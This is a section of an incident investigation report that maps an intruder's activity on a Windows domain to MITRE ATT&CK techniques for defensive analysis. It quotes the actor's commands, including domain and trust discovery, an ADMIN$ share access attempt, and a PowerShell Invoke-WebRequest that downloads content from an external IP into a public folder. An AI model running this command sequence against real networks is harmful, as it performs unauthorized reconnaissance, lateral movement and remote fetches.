# MITRE ATT&CK Mapping

## Purpose

This section maps the behaviors observed during the investigation to the MITRE ATT&CK Enterprise framework.

The mapping is intentionally limited to activity supported by the available evidence.

The goal is not to attach an ATT&CK technique to every event in the timeline. The value of the mapping is to describe observed adversary behavior in a common language and connect the investigation to recognizable detection and response patterns.

---

## ATT&CK Summary

| Tactic | Technique | ID | Observed Behavior |
|---|---|---|---|
| Initial Access / Persistence / Privilege Escalation / Defense Evasion | Valid Accounts: Domain Accounts | T1078.002 | Compromised sarnold domain credentials used to authenticate to IT-LT-017 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell launched after authentication and used for discovery and an external HTTPS request |
| Discovery | System Owner/User Discovery | T1033 | whoami used to identify the current user |
| Discovery | System Network Configuration Discovery | T1016 | ipconfig /all and arp -a used to examine local network configuration and neighboring systems |
| Discovery | Account Discovery: Domain Account | T1087.002 | net user sarnold /domain used to query domain account information |
| Discovery | Domain Trust Discovery | T1482 | nltest /domain_trusts used to enumerate domain trust relationships |
| Discovery | Network Share Discovery | T1135 | net view used to identify available remote resources |
| Discovery | Remote System Discovery | T1018 | ping, ARP information, and remote host queries used while identifying IT-WS-031 |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 | net use attempted access to the ADMIN$ share on IT-WS-031 using sarnold credentials |

---

## T1078.002 - Valid Accounts: Domain Accounts

### Observed Activity

The incident begins with repeated failed authentication attempts for sarnold followed by a successful interactive logon to IT-LT-017.

sarnold is a legitimate Active Directory domain account.

The investigation ultimately determines that the credentials were being used without authorization.

### Case Evidence

Authentication telemetry shows:

- five failed sarnold logons
- successful authentication at 06:50:54
- later use of the same credentials against IT-WS-031

The account itself was valid.

The issue was unauthorized use of valid credentials.

### Mapping Rationale

This maps to T1078.002 because the actor used an existing domain account rather than creating a new identity or exploiting an authentication mechanism directly.

The available evidence does not establish how the credentials were obtained.

Credential theft, password reuse, phishing, or another acquisition method should therefore not be mapped without additional evidence.

---

## T1059.001 - Command and Scripting Interpreter: PowerShell

### Observed Activity

PowerShell begins executing on IT-LT-017 at 06:53:42 shortly after successful authentication.

The session is used alongside native Windows utilities for discovery activity.

At 06:58:03, PowerShell initiates an outbound HTTPS request and writes the returned content to a local directory.

### Case Evidence

Observed PowerShell activity includes:

powershell.exe 

and later:

powershell.exe -NoProfile -Command Invoke-WebRequest -UseBasicParsing https://198.51.100.42/status -OutFile C:\Users\Public\Documents\status.txt

### Mapping Rationale

PowerShell is a legitimate administrative tool and its execution alone is not treated as malicious.

The ATT&CK mapping describes the execution method being used.

The significance comes from its position within the larger sequence of unauthorized authentication, discovery, external communication, and attempted lateral movement.

---

## T1033 - System Owner/User Discovery

### Observed Activity

The session executes:

whoami

at 06:54:07.

### Mapping Rationale

The command identifies the user context of the current session.

This is consistent with System Owner/User Discovery.

For a legitimate help desk technician, whoami would not normally be noteworthy.

Its relevance comes from the fact that it occurs immediately after the suspicious authentication and as part of a broader discovery sequence.

---

## T1016 - System Network Configuration Discovery

### Observed Activity

The session executes:

ipconfig /all

followed later by:

arp -a

The activity gathers information about the endpoint's network configuration and locally visible network systems.

### Mapping Rationale

These commands fit System Network Configuration Discovery because they expose information such as:

- IP configuration
- network interfaces
- gateways
- DNS configuration
- neighboring IP and MAC information

Again, the commands are normal administrative utilities.

The mapping describes the behavior, not an automatic malicious verdict.

---

## T1087.002 - Account Discovery: Domain Account

### Observed Activity

The session executes:

net user sarnold /domain

### Mapping Rationale

The command queries information about a domain account through Active Directory.

This fits Domain Account Discovery.

Although the actor already possessed working sarnold credentials, querying the domain account can help establish account context, domain visibility, or potential follow-on access.

---

## T1482 - Domain Trust Discovery

### Observed Activity

The session executes:

nltest /domain_trusts

at 06:55:21.

### Mapping Rationale

This is a direct match for Domain Trust Discovery.

The command can identify trust relationships available within a Windows domain environment and may help determine whether additional domains or authentication paths are reachable.

In this case, there is no evidence that a discovered trust was later exploited.

The mapping therefore stops at discovery.

---

## T1135 - Network Share Discovery

### Observed Activity

The session executes:

net view /domain

and later:

net view \\IT-WS-031

### Mapping Rationale

The commands are used to identify network resources and shares available within the environment.

The query against IT-WS-031 becomes particularly relevant because it occurs shortly before the ADMIN$ access attempt.

The evidence supports resource discovery but not successful access to a remote share.

---

## T1018 - Remote System Discovery

### Observed Activity

The session performs several actions associated with identifying and validating another internal endpoint:

- arp -a
- ping IT-WS-031
- net view \\IT-WS-031

### Mapping Rationale

These actions support Remote System Discovery because the actor is identifying another reachable system and determining whether it can be contacted.

The behavior becomes the bridge between local discovery and the later lateral movement attempt.

---

## T1021.002 - Remote Services: SMB/Windows Admin Shares

### Observed Activity

At approximately 07:01:51, the session executes:

net use \\IT-WS-031\ADMIN$ /user:NPS\sarnold

Network telemetry then records SMB traffic to TCP 445.

Authentication telemetry records failed network logons against IT-WS-031 shortly afterward.

### Mapping Rationale

ADMIN$ is a Windows administrative share accessed over SMB.

The sequence is consistent with attempted use of a valid domain account to access a remote Windows administrative share.

The access attempt failed.

This distinction matters.

The case supports attempted lateral movement using SMB/Windows Admin Shares.

It does not support successful lateral movement or execution on IT-WS-031.

---

## ATT&CK Progression

The mapped behaviors produce the following high-level progression:

```text
T1078.002
Valid Domain Account
        |
        v
T1059.001
PowerShell
        |
        v
T1033 / T1016 / T1087.002 / T1482
Local, Network, Account, and Domain Discovery
        |
        v
T1135 / T1018
Network Share and Remote System Discovery
        |
        v
T1021.002
Attempted SMB / ADMIN$ Lateral Movement
```

The progression is more useful than any individual technique.

It shows how valid credentials and legitimate Windows administration tools can move from normal-looking activity into a recognizable adversary sequence.

---

## Techniques Not Mapped

Several ATT&CK techniques could be plausible in a larger incident but are not supported by the available evidence.

This case does not currently map:

- Credential Dumping
- Phishing
- Brute Force
- Persistence
- Privilege Escalation through exploitation
- Scheduled Task execution
- Service execution
- Remote Desktop Protocol
- Windows Remote Management
- Command and Control
- Exfiltration
- Data Staging

For example, the actor clearly obtained the sarnold credentials somehow.

That does not mean the case supports Credential Dumping or Phishing.

Likewise, an outbound PowerShell HTTPS connection exists, but the evidence is not sufficient to characterize it as confirmed command-and-control traffic.

Those distinctions keep the ATT&CK mapping tied to what the investigation actually established.

---

## Mapping Principle

ATT&CK is being used here as a classification framework, not as a way to make the incident look larger than it was.

The mapping should follow the evidence.

If the evidence only supports discovery, the technique stops at discovery.

If lateral movement was attempted but failed, it should be documented as attempted lateral movement.

That keeps the framework useful and keeps the final case defensible.
